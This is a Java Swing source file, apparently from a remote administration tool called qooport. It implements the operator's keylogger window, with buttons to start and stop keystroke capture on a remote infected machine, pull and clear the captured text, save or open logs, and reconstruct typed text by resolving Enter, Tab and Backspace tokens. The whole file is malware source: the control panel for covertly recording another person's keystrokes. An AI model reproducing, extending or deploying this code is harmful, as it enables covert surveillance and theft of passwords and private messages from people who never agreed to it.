package qooport.modulos.keylogger;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JToolBar;
import qooport.asociado.Asociado;
import qooport.utilidades.Util;

public class KeyLogger extends JFrame {

    private Asociado servidor = null;
    public JTextArea contenido;
    private PedirKeyLogger hiloPedir = null;

    public KeyLogger(Asociado servidor) {
        this.servidor = servidor;
        if (servidor != null) {
            hiloPedir = new PedirKeyLogger(servidor, 1);
        }
        initComponents();
    }

    private void initComponents() {

        /////////////////////////////////////////////
//                TABLE DE INFORMACION
        /////////////////////////////////////////////
        JPanel panelFileZila = new JPanel();
        JToolBar b1 = new JToolBar();
        b1.setFloatable(false);
        final JButton btnActivar = new JButton();
        JScrollPane jScrollPane1;
        jScrollPane1 = new JScrollPane();
        btnActivar.setIcon(Util.cargarIcono16("/resources/start.png"));
        btnActivar.setVisible(true);
        btnActivar.setText("Iniciar");
        btnActivar.setEnabled(servidor != null);
        btnActivar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                KeyLogger.this.btnActivarDetener(evt);
                if (hiloPedir.isActivo()) {
                    btnActivar.setIcon(Util.cargarIcono16("/resources/stop.png"));
                    btnActivar.setText("Detener");
                } else {
                    btnActivar.setIcon(Util.cargarIcono16("/resources/start.png"));
                    btnActivar.setText("Iniciar");
                }
            }
        });
        b1.add(btnActivar);
        JButton btnProcesar = new JButton();
        btnProcesar.setIcon(Util.cargarIcono16("/resources/procesartexto.png"));
        btnProcesar.setText("Procesar");
        btnProcesar.setVisible(true);
        btnProcesar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                KeyLogger.this.btnProcesarTexto(evt);
            }
        });
        b1.add(btnProcesar);
        JButton btnPedirTexto = new JButton();
        btnPedirTexto.setIcon(Util.cargarIcono16("/resources/down_arrow.png"));
        btnPedirTexto.setVisible(true);
        btnPedirTexto.setText("Pedir");
        btnPedirTexto.setEnabled(servidor != null);
        btnPedirTexto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                KeyLogger.this.btnGetTexto(evt);
            }
        });
        b1.add(btnPedirTexto);
        JButton btnVaciar = new JButton();
        btnVaciar.setIcon(Util.cargarIcono16("/resources/delete.png"));
        btnVaciar.setVisible(true);
        btnVaciar.setText("Vaciar");
        btnVaciar.setEnabled(servidor != null);
        btnVaciar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                KeyLogger.this.btnVaciar(evt);
            }
        });
        b1.add(btnVaciar);
        b1.addSeparator();

        JButton btnAbrir = new JButton();
        btnAbrir.setIcon(Util.cargarIcono16("/resources/folder.png"));
        btnAbrir.setVisible(true);
        btnAbrir.setText("Abrir");
        btnAbrir.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                contenido.setText(Util.abrirArchivoKeylogger());
            }
        });
        b1.add(btnAbrir);
        JButton btnGuardar = new JButton();
        btnGuardar.setIcon(Util.cargarIcono16("/resources/save.png"));
        btnGuardar.setVisible(true);
        btnGuardar.setText("Guardar");
        btnGuardar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Util.guardarTexto(contenido.getText());
            }
        });
        b1.add(btnGuardar);

        contenido = new JTextArea();
        jScrollPane1.setViewportView(this.contenido);
        panelFileZila.setLayout(new BorderLayout());
        panelFileZila.add(jScrollPane1, BorderLayout.CENTER);
        panelFileZila.add(b1, BorderLayout.SOUTH);

        this.setLayout(new BorderLayout());
//        this.add(barra, BorderLayout.NORTH);
        this.add(panelFileZila, BorderLayout.CENTER);
        this.setSize(600, 450);
        this.setResizable(true);
        this.setVisible(true);
        this.setIconImage(Util.cargarIcono16("/resources/key_ctrl.png").getImage());
        pack();
    }

    private void btnActivarDetener(ActionEvent evt) {
        if (hiloPedir.isActivo()) {
            servidor.detenerKeyLogger();
            hiloPedir.detener();
        } else {
            servidor.activarKeyLogger();
            hiloPedir.iniciar();
        }
    }

    private void btnProcesarTexto(ActionEvent evt) {
        String procesado = contenido.getText();
        procesado = procesado.replaceAll("<Intro>", "\n");
        procesado = procesado.replaceAll("<Tabulador>", "\t");
        procesado = procesado.replaceAll("<Retroceso>", "\b");
        while (procesado.contains("\b")) {
            procesado = procesado.replaceAll("^\b+|[^\b]\b", "");
        }
        //
        contenido.setText(procesado);
    }

    private void btnGetTexto(ActionEvent evt) {
        servidor.pedirKeyLoggerTexto();
    }

    private void btnVaciar(ActionEvent evt) {
        servidor.vaciarKeyLogger();
    }

}
